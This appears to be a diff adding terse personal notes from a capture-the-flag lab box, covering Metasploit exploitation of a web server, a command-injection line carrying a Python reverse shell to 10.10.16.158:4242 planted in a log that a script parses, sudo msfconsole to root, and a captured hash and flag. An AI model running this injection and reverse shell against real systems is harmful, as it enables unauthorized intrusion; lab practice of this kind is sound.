@@ -1,0 +1,30 @@
+port 5000 web server
+	nmap & searchsploit locked down w/ filters
+	file upload w/ msfvenom?
+
+	msfvenom APK CVE 
+	
+Used msfconsole/ searchsploit to get metasploit module
+
+Upgraded to meterpreter shell
+
+got ssh for kid
+
+user hash: 509166014921802a9507355f9c91cda5
+
+Ran recon/local_exploit_suggester
+
+user "pwn" has a "scanlosers.sh" script
+	Checks /home/kid/logs/hacker 3rd field and beyond
+	Put code for reverse shell?
+
+0 0 &python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.158",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'& pwd>/home/kid/.cyberswell/test.txt
+
+got ssh for pwn
+
+as user pwn: sudo -l shows msfconsole can run as root (lmfao)
+
+sudo msfconsole (LMFAO)
+cat /root/root.txt (LMFAOOO)
+b896174b445ab2f524d28c6406c067e8
+
